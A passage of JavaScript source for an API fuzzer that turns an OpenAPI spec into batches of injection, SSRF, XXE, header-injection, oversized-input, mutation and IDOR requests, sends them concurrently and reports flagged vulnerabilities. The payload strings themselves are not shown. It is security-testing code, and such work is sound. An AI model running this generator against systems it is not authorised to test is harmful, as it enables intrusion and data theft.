      type: 'header_mutation', subType: 'extreme',
      queryParams: normalPayload.query, headers: extremeHeaders,
      body: normalPayload.body,
      payload: { type: 'header_extreme', mutated: extremeHeaders }
    });
    
    const extremeHeaders2 = this.mutator.generateExtremeHeaders();
    tests.push({
      id: `${method}_${pathUrl}_headers_extreme2`,
      method, url: finalUrl, path: pathUrl,
      type: 'header_mutation', subType: 'extreme2',
      queryParams: normalPayload.query,
      headers: { ...baseHeaders, ...extremeHeaders2 },
      body: normalPayload.body,
      payload: { type: 'header_extreme2', mutated: extremeHeaders2 }
    });
    
    return tests;
  }

  buildLargePayload(operation, largeValue) {
    const result = { query: {}, path: {}, body: null };
    
    const pathParams = this.extractPathParams(operation.path);
    for (const paramName of pathParams) {
      result.path[paramName] = largeValue;
    }
    
    const parameters = operation.parameters || [];
    for (const param of parameters) {
      if (param.in === 'query') {
        result.query[param.name] = largeValue;
      }
    }
    
    if (operation.requestBody && ['post', 'put', 'patch'].includes(operation.method)) {
      result.body = { data: largeValue };
    }
    
    return result;
  }

  // ============================================================
  // ГЕНЕРАЦИЯ IDOR/BOLA ТЕСТОВ
  // ============================================================
  generateIdorTests(method, pathUrl, fullUrl, operation, baseHeaders) {
    const tests = [];
    const normalPayload = this.generateNormalPayload(operation);
    const finalUrl = this.interpolateUrl(fullUrl, normalPayload.path);
    
    // 1. Числовые ID
    for (const id of PAYLOADS.idor.numeric.slice(0, 8)) {
      const idorPayload = this.buildInjectionPayload(operation, id);
      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
      tests.push({
        id: `${method}_${pathUrl}_idor_num_${id}`,
        method, url: idorUrl, path: pathUrl,
        type: 'idor', subType: 'numeric',
        queryParams: idorPayload.query,
        headers: { ...baseHeaders },
        body: idorPayload.body,
        payload: { type: 'idor', value: id }
      });
    }
    
    // 2. Строковые ID
    for (const id of PAYLOADS.idor.string.slice(0, 5)) {
      const idorPayload = this.buildInjectionPayload(operation, id);
      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
      tests.push({
        id: `${method}_${pathUrl}_idor_str_${id.substring(0, 10)}`,
        method, url: idorUrl, path: pathUrl,
        type: 'idor', subType: 'string',
        queryParams: idorPayload.query,
        headers: { ...baseHeaders },
        body: idorPayload.body,
        payload: { type: 'idor', value: id }
      });
    }
    
    // 3. Email
    for (const email of PAYLOADS.idor.email) {
      const idorPayload = this.buildInjectionPayload(operation, email);
      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
      tests.push({
        id: `${method}_${pathUrl}_idor_email_${email}`,
        method, url: idorUrl, path: pathUrl,
        type: 'idor', subType: 'email',
        queryParams: idorPayload.query,
        headers: { ...baseHeaders },
        body: idorPayload.body,
        payload: { type: 'idor', value: email }
      });
    }
    
    // 4. Username
    for (const username of PAYLOADS.idor.username) {
      const idorPayload = this.buildInjectionPayload(operation, username);
      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
      tests.push({
        id: `${method}_${pathUrl}_idor_user_${username}`,
        method, url: idorUrl, path: pathUrl,
        type: 'idor', subType: 'username',
        queryParams: idorPayload.query,
        headers: { ...baseHeaders },
        body: idorPayload.body,
        payload: { type: 'idor', value: username }
      });
    }
    
    // 5. SQL injection для IDOR
    for (const sql of PAYLOADS.idor.sql) {
      const idorPayload = this.buildInjectionPayload(operation, sql);
      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
      tests.push({
        id: `${method}_${pathUrl}_idor_sql_${sql.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
        method, url: idorUrl, path: pathUrl,
        type: 'idor', subType: 'sql',
        queryParams: idorPayload.query,
        headers: { ...baseHeaders },
        body: idorPayload.body,
        payload: { type: 'idor', value: sql }
      });
    }
    
    // 6. Path traversal для IDOR
    for (const pathVal of PAYLOADS.idor.path) {
      const idorPayload = this.buildInjectionPayload(operation, pathVal);
      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
      tests.push({
        id: `${method}_${pathUrl}_idor_path_${pathVal.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
        method, url: idorUrl, path: pathUrl,
        type: 'idor', subType: 'path',
        queryParams: idorPayload.query,
        headers: { ...baseHeaders },
        body: idorPayload.body,
        payload: { type: 'idor', value: pathVal }
      });
    }
    
    // 7. Если есть query параметры - пробуем IDOR в них
    if (normalPayload.query && Object.keys(normalPayload.query).length > 0) {
      for (const [key] of Object.entries(normalPayload.query)) {
        for (const id of PAYLOADS.idor.numeric.slice(0, 3)) {
          const mutatedQuery = { ...normalPayload.query };
          mutatedQuery[key] = id;
          tests.push({
            id: `${method}_${pathUrl}_idor_query_${key}_${id}`,
            method, url: finalUrl, path: pathUrl,
            type: 'idor', subType: 'query',
            queryParams: mutatedQuery,
            headers: { ...baseHeaders },
            body: normalPayload.body,
            payload: { type: 'idor', key: key, value: id }
          });
        }
      }
    }
    
    return tests;
  }

  generateTestCases() {
    writeLog('info', 'Генерация тестов...');
    const testCases = [];
    const paths = this.spec.paths || {};

    for (const [pathUrl, pathItem] of Object.entries(paths)) {
      for (const [method, operation] of Object.entries(pathItem)) {
        const allowedMethods = ['get', 'post', 'put', 'delete', 'patch'];
        if (!allowedMethods.includes(method)) continue;

        operation.path = pathUrl;
        operation.method = method;
        
        const fullUrl = this.normalizeUrl(`${this.baseUrl}${pathUrl}`);
        const baseHeaders = this.getHeaders(operation);
        
        const normalPayload = this.generateNormalPayload(operation);
        const finalUrl = this.interpolateUrl(fullUrl, normalPayload.path);
        
        // Нормальный тест
        testCases.push({
          id: `${method}_${pathUrl}_normal`,
          method, url: finalUrl, path: pathUrl,
          type: 'normal',
          queryParams: normalPayload.query,
          headers: { ...baseHeaders },
          body: normalPayload.body,
          payload: normalPayload
        });
        
        // SQL инъекции
        for (const payload of PAYLOADS.sql.error_based.slice(0, 3)) {
          const injectionPayload = this.buildInjectionPayload(operation, payload);
          const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
          testCases.push({
            id: `${method}_${pathUrl}_sql_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
            method, url: injectionUrl, path: pathUrl,
            type: 'injection', category: 'sql',
            queryParams: injectionPayload.query,
            headers: { ...baseHeaders },
            body: injectionPayload.body,
            payload: payload
          });
        }
        
        // XSS
        for (const payload of PAYLOADS.xss.reflected.slice(0, 3)) {
          const injectionPayload = this.buildInjectionPayload(operation, payload);
          const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
          testCases.push({
            id: `${method}_${pathUrl}_xss_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
            method, url: injectionUrl, path: pathUrl,
            type: 'injection', category: 'xss',
            queryParams: injectionPayload.query,
            headers: { ...baseHeaders },
            body: injectionPayload.body,
            payload: payload
          });
        }
        
        // Command injection
        for (const payload of PAYLOADS.command.linux.slice(0, 3)) {
          const injectionPayload = this.buildInjectionPayload(operation, payload);
          const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
          testCases.push({
            id: `${method}_${pathUrl}_cmd_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
            method, url: injectionUrl, path: pathUrl,
            type: 'injection', category: 'command',
            queryParams: injectionPayload.query,
            headers: { ...baseHeaders },
            body: injectionPayload.body,
            payload: payload
          });
        }
        
        // Path Traversal
        for (const payload of PAYLOADS.path.linux.slice(0, 3)) {
          const injectionPayload = this.buildInjectionPayload(operation, payload);
          const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
          testCases.push({
            id: `${method}_${pathUrl}_path_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
            method, url: injectionUrl, path: pathUrl,
            type: 'injection', category: 'path',
            queryParams: injectionPayload.query,
            headers: { ...baseHeaders },
            body: injectionPayload.body,
            payload: payload
          });
        }
        
        // SSRF
        for (const payload of PAYLOADS.ssrf.cloud_metadata) {
          const injectionPayload = this.buildInjectionPayload(operation, payload);
          const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
          testCases.push({
            id: `${method}_${pathUrl}_ssrf`,
            method, url: injectionUrl, path: pathUrl,
            type: 'injection', category: 'ssrf',
            queryParams: injectionPayload.query,
            headers: { ...baseHeaders },
            body: injectionPayload.body,
            payload: payload
          });
        }
        
        // NoSQL
        for (const payload of PAYLOADS.nosql.operators.slice(0, 3)) {
          const injectionPayload = this.buildInjectionPayload(operation, payload);
          const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
          testCases.push({
            id: `${method}_${pathUrl}_nosql`,
            method, url: injectionUrl, path: pathUrl,
            type: 'injection', category: 'nosql',
            queryParams: injectionPayload.query,
            headers: { ...baseHeaders },
            body: injectionPayload.body,
            payload: payload
          });
        }
        
        // XXE
        for (const payload of PAYLOADS.xxe) {
          testCases.push({
            id: `${method}_${pathUrl}_xxe`,
            method, url: finalUrl, path: pathUrl,
            type: 'xxe',
            headers: { ...baseHeaders, 'Content-Type': 'application/xml' },
            body: payload,
            payload: payload
          });
        }
        
        // GraphQL
        for (const payload of PAYLOADS.graphql) {
          testCases.push({
            id: `${method}_${pathUrl}_graphql`,
            method, url: finalUrl, path: pathUrl,
            type: 'graphql',
            headers: { ...baseHeaders },
            body: { query: payload },
            payload: payload
          });
        }
        
        // SOAP
        for (const payload of PAYLOADS.soap) {
          testCases.push({
            id: `${method}_${pathUrl}_soap`,
            method, url: finalUrl, path: pathUrl,
            type: 'soap',
            headers: { ...baseHeaders, 'Content-Type': 'application/soap+xml' },
            body: payload,
            payload: payload
          });
        }
        
        // Header injection
        for (const headerPayload of PAYLOADS.header.crlf) {
          testCases.push({
            id: `${method}_${pathUrl}_header`,
            method, url: finalUrl, path: pathUrl,
            type: 'header_injection',
            queryParams: normalPayload.query,
            headers: { ...baseHeaders, 'User-Agent': headerPayload, 'X-Test-Header': headerPayload },
            body: normalPayload.body,
            payload: { header: headerPayload }
          });
        }
        
        // Header mutation variants
        const headerMutationVariants = this.generateHeaderMutationVariants(baseHeaders);
        for (const headerVariant of headerMutationVariants) {
          testCases.push({
            id: `${method}_${pathUrl}_headers_${headerVariant.type}`,
            method, url: finalUrl, path: pathUrl,
            type: 'header_mutation', subType: headerVariant.type,
            queryParams: normalPayload.query,
            headers: headerVariant.headers,
            body: normalPayload.body,
            payload: { type: 'header_mutation', variant: headerVariant.type, mutated: headerVariant.headers }
          });
        }
        
        // Large payload
        for (const largeStr of PAYLOADS.large.strings.slice(0, 2)) {
          const largePayload = this.buildLargePayload(operation, largeStr);
          const largeUrl = this.interpolateUrl(fullUrl, largePayload.path);
          testCases.push({
            id: `${method}_${pathUrl}_large`,
            method, url: largeUrl, path: pathUrl,
            type: 'large_payload',
            queryParams: largePayload.query,
            headers: { ...baseHeaders },
            body: largePayload.body,
            payload: { size: largeStr.length }
          });
        }
        
        // Мутационные тесты для BODY
        if (normalPayload.body && typeof normalPayload.body === 'object') {
          const mutatedBody = JSON.parse(JSON.stringify(normalPayload.body));
          this.mutator.recursiveInject(mutatedBody, 'injection');
          testCases.push({
            id: `${method}_${pathUrl}_mutation_body_injection`,
            method, url: finalUrl, path: pathUrl,
            type: 'mutation', subType: 'body_injection',
            queryParams: normalPayload.query,
            headers: { ...baseHeaders },
            body: mutatedBody,
            payload: { original: normalPayload.body, mutated: mutatedBody }
          });
          
          const largeBody = JSON.parse(JSON.stringify(normalPayload.body));
          this.mutator.recursiveInject(largeBody, 'large');
          testCases.push({
            id: `${method}_${pathUrl}_mutation_body_large`,
            method, url: finalUrl, path: pathUrl,
            type: 'mutation', subType: 'body_large',
            queryParams: normalPayload.query,
            headers: { ...baseHeaders },
            body: largeBody,
            payload: { original: normalPayload.body, mutated: largeBody }
          });
          
          for (let i = 0; i < CONFIG.EXTREME_MUTATION_COUNT; i++) {
            try {
              const extremeBody = JSON.parse(JSON.stringify(normalPayload.body));
              const mutated = this.mutator.mutateObjectExtreme(extremeBody, 0, CONFIG.MUTATION_DEPTH);
              if (mutated) {
                testCases.push({
                  id: `${method}_${pathUrl}_extreme_mutation_body_${i}`,
                  method, url: finalUrl, path: pathUrl,
                  type: 'extreme_mutation', subType: 'body',
                  queryParams: normalPayload.query,
                  headers: { ...baseHeaders },
                  body: mutated,
                  payload: { original: normalPayload.body, mutated: mutated }
                });
              }
            } catch (e) {
              writeLog('debug', `Ошибка extreme мутации body: ${e.message}`);
            }
          }
        }
        
        // Мутационные тесты для QUERY параметров
        if (normalPayload.query && Object.keys(normalPayload.query).length > 0) {
          const mutatedQuery = JSON.parse(JSON.stringify(normalPayload.query));
          this.mutator.recursiveInject(mutatedQuery, 'injection');
          testCases.push({
            id: `${method}_${pathUrl}_mutation_query_injection`,
            method, url: finalUrl, path: pathUrl,
            type: 'mutation', subType: 'query_injection',
            queryParams: mutatedQuery,
            headers: { ...baseHeaders },
            body: normalPayload.body,
            payload: { original: normalPayload.query, mutated: mutatedQuery }
          });
          
          const largeQuery = JSON.parse(JSON.stringify(normalPayload.query));
          this.mutator.recursiveInject(largeQuery, 'large');
          testCases.push({
            id: `${method}_${pathUrl}_mutation_query_large`,
            method, url: finalUrl, path: pathUrl,
            type: 'mutation', subType: 'query_large',
            queryParams: largeQuery,
            headers: { ...baseHeaders },
            body: normalPayload.body,
            payload: { original: normalPayload.query, mutated: largeQuery }
          });
        }
        
        // Мутационные тесты для PATH параметров
        if (normalPayload.path && Object.keys(normalPayload.path).length > 0) {
          const mutatedPath = JSON.parse(JSON.stringify(normalPayload.path));
          this.mutator.recursiveInject(mutatedPath, 'injection');
          const mutatedPathUrl = this.interpolateUrl(fullUrl, mutatedPath);
          testCases.push({
            id: `${method}_${pathUrl}_mutation_path_injection`,
            method, url: mutatedPathUrl, path: pathUrl,
            type: 'mutation', subType: 'path_injection',
            queryParams: normalPayload.query,
            headers: { ...baseHeaders },
            body: normalPayload.body,
            payload: { original: normalPayload.path, mutated: mutatedPath }
          });
          
          const largePath = JSON.parse(JSON.stringify(normalPayload.path));
          this.mutator.recursiveInject(largePath, 'large');
          const largePathUrl = this.interpolateUrl(fullUrl, largePath);
          testCases.push({
            id: `${method}_${pathUrl}_mutation_path_large`,
            method, url: largePathUrl, path: pathUrl,
            type: 'mutation', subType: 'path_large',
            queryParams: normalPayload.query,
            headers: { ...baseHeaders },
            body: normalPayload.body,
            payload: { original: normalPayload.path, mutated: largePath }
          });
        }
        
        // Если нет данных для мутации
        const hasNoData = (!normalPayload.body || Object.keys(normalPayload.body).length === 0) &&
                          (!normalPayload.query || Object.keys(normalPayload.query).length === 0) &&
                          (!normalPayload.path || Object.keys(normalPayload.path).length === 0);
        
        if (hasNoData) {
          const testData = { test: 'value', id: 1, name: 'test', data: { nested: 'value' } };
          
          const mutatedTestBody = JSON.parse(JSON.stringify(testData));
          this.mutator.recursiveInject(mutatedTestBody, 'injection');
          testCases.push({
            id: `${method}_${pathUrl}_mutation_test_body`,
            method, url: finalUrl, path: pathUrl,
            type: 'mutation', subType: 'test_body',
            queryParams: null,
            headers: { ...baseHeaders },
            body: mutatedTestBody,
            payload: { type: 'test_data', mutated: mutatedTestBody }
          });
          
          for (let i = 0; i < CONFIG.EXTREME_MUTATION_COUNT; i++) {
            try {
              const extremeTestData = JSON.parse(JSON.stringify(testData));
              const mutated = this.mutator.mutateObjectExtreme(extremeTestData, 0, CONFIG.MUTATION_DEPTH);
              if (mutated) {
                testCases.push({
                  id: `${method}_${pathUrl}_extreme_mutation_test_${i}`,
                  method, url: finalUrl, path: pathUrl,
                  type: 'extreme_mutation', subType: 'test',
                  queryParams: null,
                  headers: { ...baseHeaders },
                  body: mutated,
                  payload: { type: 'test_data', mutated: mutated }
                });
              }
            } catch (e) {
              writeLog('debug', `Ошибка extreme мутации test: ${e.message}`);
            }
          }
        }
        
        // ============================================================
        // ДОБАВЛЯЕМ IDOR/BOLA ТЕСТЫ
        // ============================================================
        const idorTests = this.generateIdorTests(method, pathUrl, fullUrl, operation, baseHeaders);
        testCases.push(...idorTests);
      }
    }

    this.testCases = testCases;
    this.stats.total = testCases.length;
    
    const mutationCount = testCases.filter(t => t.type === 'mutation' || t.type === 'extreme_mutation').length;
    const idorCount = testCases.filter(t => t.type === 'idor').length;
    writeLog('info', `Сгенерировано ${testCases.length} тестов (включая ${mutationCount} мутационных, ${idorCount} IDOR)`);
    
    return testCases;
  }

  async run() {
    writeLog('info', 'ЗАПУСК SUPER FUZZER');
    writeLog('info', '='.repeat(60));
    
    this.startTime = Date.now();
    await this.loadSpec();
    this.generateTestCases();
    
    const results = [];
    let completed = 0;
    
    const chunks = this.chunkArray(this.testCases, this.concurrency);
    
    for (const chunk of chunks) {
      const chunkResults = await Promise.all(
        chunk.map(async (testCase) => {
          const result = await this.executeTest(testCase);
          completed++;
          return result;
        })
      );
      results.push(...chunkResults);
    }
    
    this.results = results;
    const report = this.getReport();
    
    writeLog('info', 'ФАЗЗИНГ ЗАВЕРШЕН');
    writeLog('info', `Статистика: ${this.stats.total} тестов, ${this.stats.vulnerabilities} уязвимостей`);
    
    return report;
  }

  async executeTest(testCase) {
    const startTime = Date.now();
    let response = null;
    let error = null;
    
    try {
      const config = {
        method: testCase.method,
        url: testCase.url,
        timeout: this.timeout,
        headers: testCase.headers,
        validateStatus: () => true,
        maxContentLength: CONFIG.MAX_RESPONSE_SIZE
      };
      
      if (testCase.queryParams && Object.keys(testCase.queryParams).length > 0) {
        config.params = testCase.queryParams;
      }
      if (testCase.body) {
        config.data = testCase.body;
      }
      
      response = await axios(config);
    } catch (err) {
      error = err;
    }
    
    const duration = Date.now() - startTime;
    const vulnerabilities = this.detector.detect(response, testCase);
    
    if (vulnerabilities.length > 0) {
      this.stats.vulnerabilities += vulnerabilities.length;
      writeLog('vuln', `НАЙДЕНА УЯЗВИМОСТЬ!`, vulnerabilities[0]);
    }
    
    return {
      ...testCase,
      status: response?.status || 0,
      duration,
      vulnerabilities,
      error: error?.message,
      timestamp: new Date().toISOString()
    };
  }

  chunkArray(array, size) {
    if (!Array.isArray(array)) return [];
    const chunks = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }

  getReport() {
    const allVulnerabilities = [];
    const vulnStats = {};
    
    for (const result of this.results) {
      const vulnerabilities = result.vulnerabilities || [];
      for (const vuln of vulnerabilities) {
        allVulnerabilities.push({
          ...vuln,
          payload: safeStringify(vuln.payload, 200)
        });
        vulnStats[vuln.type] = (vulnStats[vuln.type] || 0) + 1;
      }
    }
    
    const report = {
      success: true,
      session_id: SESSION_ID,
      log_file: LOG_FILE,
      summary: {
        total_tests: this.results.length,
        vulnerabilities_found: allVulnerabilities.length,
        unique_types: Object.keys(vulnStats).length,
        duration_seconds: (Date.now() - this.startTime) / 1000,
        endpoints_tested: new Set(this.results.map(r => r?.path).filter(Boolean)).size,
        concurrency: this.concurrency,
        mutation_tests: this.results.filter(r => r.type === 'mutation' || r.type === 'extreme_mutation').length,
        idor_tests: this.results.filter(r => r.type === 'idor').length
      },
      vulnerabilities_by_type: vulnStats,
      vulnerabilities: allVulnerabilities,
      timestamp: new Date().toISOString()
    };
    
    writeLog('info', 'ОТЧЕТ', report.summary);
    
    return report;
  }

  saveReport(file) {
    const report = this.getReport();
    fs.writeFileSync(file, JSON.stringify(report, null, 2));
    writeLog('info', `Отчет сохранен: ${file}`);
    return report;
  }
}

export default APIFuzzer;